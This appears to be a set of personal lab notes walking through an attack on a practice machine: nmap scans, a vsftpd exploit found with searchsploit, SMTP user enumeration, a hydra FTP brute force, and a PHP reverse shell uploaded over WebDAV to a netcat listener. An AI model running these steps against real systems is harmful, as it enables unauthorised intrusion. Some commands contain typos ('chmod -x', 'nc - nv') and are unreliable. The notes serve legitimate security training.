

#### Port scanning & enumeration 

- service versoin detection scan on target system `nmap -sV -p1-10000 target -oN nmap_10k.txt 
- manual banner grabbing if nmap does not provide any results: `nc - nv ip port`

![[Pasted image 20230916125239.png]] 
this port allowed a connection to a bind shell listener (root shell :O)


#### Targeting vsFTPd

- nmap port 21 
if anonymous login is allowed we can login without credentials
- ftp ip port (username:anonoymous emptypassword)
- `searchsploit vsftpd `
- `searchsploit -m exploitdb_id 
- analyze exploit with `vim` 
- `chmod -x file`
- `python3 file ip `

it is possible that this does not work bc the port used in this exploit can be removed  by the administrator (check port wit nmap) -> exploits might not work bc they have been patched. 

- nmap -sV -p 25 ip (SMTP)
smtp gives you easy way to identify user accounts on target system. 
	- use msfconsole
	- search smtp_enum 
 accounts: add them to textfile. 

Use the account `service` in the bruteforce, not interesting to use service accounts for bruteforce. Only use user-accounts in bruteforce
ftp bruteforce: `hydra -l service -P /usr/share/metasploit-framework/data/wordlists/unix_users.txt target protocol `

Connect to ftp with credentials of useraccount
- pwd (if result is /home/service that that confirms that this is a user-account)
- cd /
- visit webserver in browser
	- Use webdav to get reverse shell 
		- `ls -al /usr/share/webshells/`
		- you need a php shell:  php-reverse-shell.php
		- copy file to current working directory: `cp /usr/share/webshells/php/php-reverse-shell.php . `
		- rename: `mv php-reverse-shell.php shell.php `
		- modify the file: change the ip to kali ip and the port should match with the port you will be listening on
			- set up netcat in other window: `nc -nvlp 1234 `
		- navigate to root of ftp (ftp stores everything under var)
			- cd /var/www
			- cd dav (only have rights to change this directory)
			- put shell.php 
			- click on the file (the netcat listener window will show a connection, /bin/bash -i)

	




























#### Targeting PHP

#### Targeting SAMBA 
